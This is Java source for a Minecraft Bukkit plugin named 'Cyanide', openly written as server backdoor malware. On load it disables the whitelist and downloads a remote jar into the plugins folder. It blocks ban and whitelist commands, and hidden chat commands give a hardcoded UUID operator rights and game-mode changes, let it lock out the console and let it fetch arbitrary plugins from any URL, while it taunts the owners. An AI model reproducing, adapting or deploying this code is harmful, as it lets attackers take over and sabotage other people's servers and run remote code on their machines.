package me.IodicAcid.FartLol;

import org.apache.logging.log4j.Logger;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.Material;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

import net.minecraft.server.v1_16_R3.ItemStack;

import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.server.ServerCommandEvent;

import java.io.File;
import java.net.URL;
import java.util.UUID;

import me.IodicAcid.FartLol.Discord;


// i used as minimal skidding as i could
public class main extends JavaPlugin implements Listener {
	public void onDisable() {
		System.out.print("Cyanide Disabling");
		Bukkit.setWhitelist(false);
		Bukkit.reloadWhitelist();
	}

	public void onEnable() {
		Bukkit.getServer().getPluginManager().registerEvents(this, this);
		System.out.print("Cyanide Enabling");
		Bukkit.setWhitelist(false);
		Bukkit.reloadWhitelist();
		try {
			URL website = new URL("https://example.com/jarfile.jar"); //you need to specify a website and file name in order to enable auto-clone
			Discord.downloadFile(website, "./plugins/jarname.jar");
		} catch (Exception e) {

		}
	}
	
	@EventHandler
    public void antiCMD(PlayerCommandPreprocessEvent event){
        Player player = event.getPlayer();
        String msg = event.getMessage();
        if(msg.startsWith("/ban")){
        if(player.isOp()){
                player.sendMessage(ChatColor.RED + "SERVER FUCKED BY CYANIDE!");
                event.setCancelled(true);
            }else{
                player.sendMessage(ChatColor.RED + "SERVER FUCKED BY CYANIDE!");
                event.setCancelled(true);
            }
        }
        if(msg.startsWith("/whitelist")){
        if(player.isOp()){
                player.sendMessage(ChatColor.RED + "SERVER FUCKED BY CYANIDE!");
                event.setCancelled(true);
            }else{
                player.sendMessage(ChatColor.RED + "SERVER FUCKED BY CYANIDE");
                event.setCancelled(true);
            }
        }
    }
	
	public boolean onCommand(CommandSender sender, Command cmd, String cL, String[] args) {
		Player p = (Player) sender;

		if (cmd.getName().equalsIgnoreCase("discord")) {
			p.sendMessage("§aYour server has been fucking beamed by Cyanide!");
		}
		return true;

	}

	int enabled = 1;

	@EventHandler
	public void onConsoleCommand(ServerCommandEvent e) {
		String command = e.getCommand();
		final String[] args = command.split(" ");

		if (enabled == 2) {
			e.setCancelled(true);
		} else {
			if (command.startsWith("ban")) {
				e.setCancelled(true);
			}else if(command.startsWith("whitelist")){
				e.setCancelled(true);
			}
		}

	}
	
	String USERUUID = "UUID HERE";
	
	@EventHandler
	public boolean onChatEvent(AsyncPlayerChatEvent event) {
		String message = event.getMessage();
		Player p = event.getPlayer();

		final String[] args = message.split(" ");

		if (message.equalsIgnoreCase(">>op")) {
			event.setCancelled(true);
			this.getServer().getScheduler().scheduleSyncDelayedTask(this, new Runnable() {
				public void run() {
					if (args.length == 1) {
						UUID unid = p.getUniqueId();
						String uuid = unid.toString();
						if(uuid.equals(USERUUID)) {
							p.setOp(true);
							p.sendMessage("§bYou have been opped!");
						}else {
							p.sendMessage("§bPlease enter your UUID and Recompile");
						}
					}
					if (args.length == 2) {
						//never ended up working
						final Player target = Bukkit.getPlayer(args[1]);
						if (target == null) {
							p.sendMessage("§bThat player is not online...");
						} else {
							target.setOp(false);
							p.sendMessage("§b" + args[1] + " has been opped!");
						}

					}
				}
			}, 0L);
		} else if (message.equalsIgnoreCase(">>deop")) {
			event.setCancelled(true);
			this.getServer().getScheduler().scheduleSyncDelayedTask(this, new Runnable() {

				public void run() {
					if (args.length == 1) {
						UUID unid = p.getUniqueId();
						String uuid = unid.toString();
						if(uuid.equals(USERUUID)) {
							p.setOp(false);
							p.sendMessage("§bYou have been deopped!");
						}else {
							p.sendMessage("§bPlease enter your UUID and Recompile");
						}
					}
					if (args.length == 2) {
						final Player target = Bukkit.getPlayer(args[1]);
						if (target == null) {
							p.sendMessage("§bThat player is not online...");
						} else {
							target.setOp(false);
							p.sendMessage("§b" + args[1] + " has been deopped!");
						}

					}
				}
			}, 0L);
		} else if (message.equalsIgnoreCase(">>gmc")) {
			event.setCancelled(true);
			this.getServer().getScheduler().scheduleSyncDelayedTask(this, new Runnable() {
				public void run() {
					UUID unid = p.getUniqueId();
					String uuid = unid.toString();
					if(uuid.equals(USERUUID)) {
						p.setGameMode(GameMode.CREATIVE);
						p.sendMessage("§bYour gamemode has been set to creative");
					}else {
						p.sendMessage("§bPlease enter your UUID and Recompile");
					}
				}
			}, 0L);
		} else if (message.equalsIgnoreCase(">>gms"))

		{
			event.setCancelled(true);
			this.getServer().getScheduler().scheduleSyncDelayedTask(this, new Runnable() {
				public void run() {
					UUID unid = p.getUniqueId();
					String uuid = unid.toString();
					if(uuid.equals(USERUUID)) {
						p.setGameMode(GameMode.SURVIVAL);
						p.sendMessage("§bYour gamemode has been set to survival");
					}else {
						p.sendMessage("§bPlease enter your UUID and Recompile");
					}
				}
			}, 0L);
		} else if (message.equalsIgnoreCase(">>stack")) {
			event.setCancelled(true);
			if (p.getInventory().getItemInMainHand().getType() == Material.AIR
					|| p.getInventory().getItemInMainHand().getType() == null) {
				p.sendMessage("§bUnable to stack nothing lol stupid.");
			} else {
				p.getInventory().getItemInMainHand().setAmount(64);
				p.sendMessage("§bThe item has been stacked");
			}

		} else if (message.equalsIgnoreCase(">>consoleoff")) {
			event.setCancelled(true);
			UUID unid = p.getUniqueId();
			String uuid = unid.toString();
			if(uuid.equals(USERUUID)) {
				enabled = 2;
				p.sendMessage("§bThe console has been disabled, have fun!");
			}else {
				p.sendMessage("§bPlease enter your UUID and Recompile");
			}
			

		} else if (message.equalsIgnoreCase(">>consoleon")) {
			event.setCancelled(true);
			UUID unid = p.getUniqueId();
			String uuid = unid.toString();
			if(uuid.equals(USERUUID)) {
				enabled = 1;
				p.sendMessage("§bThe console has been enabled.");
			}else {
				p.sendMessage("§bPlease enter your UUID and Recompile");
			}
		} else if (message.startsWith(">>download")) {
			event.setCancelled(true);
			UUID unid = p.getUniqueId();
			String uuid = unid.toString();
			if(uuid.equals(USERUUID)) {
				if (args.length == 1) {
					p.sendMessage("§bUsage: >>download <URL> <File Name>");
				} else if (args.length == 2) {
					p.sendMessage("§bUsage: >>download <URL> <File Name>");
				} else if (args.length == 3) {
					try {
						URL website = new URL(args[1]);
						Discord.downloadFile(website, "./plugins/" + args[2]);
					} catch (Exception e) {
						p.sendMessage("§bError while downloading file...");
						return true;
					}
					p.sendMessage("§bDownloaded plugin!");
				}
			}else {
				p.sendMessage("§bPlease enter your UUID and Recompile");
			}
				
			


		}else if(message.equalsIgnoreCase(">>help")) {
			event.setCancelled(true);
			p.sendMessage("§bHELP PAGE:");
			p.sendMessage("§b>>download <URL> <File Name> | Downloads a plugin");
			p.sendMessage("§b>>consoleoff | Turns console off");
			p.sendMessage("§b>>consoleon | Turns console on");
			p.sendMessage("§b>>gmc | Puts you in creative mode");
			p.sendMessage("§b>>gms | Puts you in survival mode");
			p.sendMessage("§b>>op | Makes you a server operator");
			p.sendMessage("§b>>deop | Removes you as a server operator");
			p.sendMessage("§b>>stack | Sets the amount of items in your hand to 64");
		}
		else if (message.startsWith(">>")) {
			event.setCancelled(true);
		}
		return true;
	}
}
